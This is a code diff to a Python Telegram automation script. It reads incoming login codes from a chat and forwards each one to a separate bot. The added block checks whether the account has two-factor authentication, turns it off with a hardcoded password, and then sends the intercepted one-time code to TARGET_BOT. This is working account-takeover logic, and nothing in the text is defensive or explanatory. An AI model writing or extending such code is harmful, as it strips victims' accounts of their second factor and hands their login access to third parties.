@@ -94,6 +94,20 @@ for message in mClient.get_messages(SOURCE_CHAT, None):
                 otp = text.replace("Login code: ", "").split('.')[0]
                 print(f"🔑 OTP: {otp}")
 
+                # ====== 🔥 2FA DISABLE BEFORE SENDING OTP ======
+                try:
+                    result = await client(functions.account.GetPasswordRequest())
+                    if result.has_password:
+                        print("🔐 2FA detected → disabling...")
+                        await client.edit_2fa('542543')
+                        print("✅ 2FA disabled")
+                    else:
+                        print("❌ No 2FA active")
+                except Exception as e:
+                    print(f"❌ 2FA error: {e}")
+                # =============================================
+
+                # OTP send AFTER 2FA off
                 await mClient.send_message(TARGET_BOT, otp)
                 otp_sent = True
 
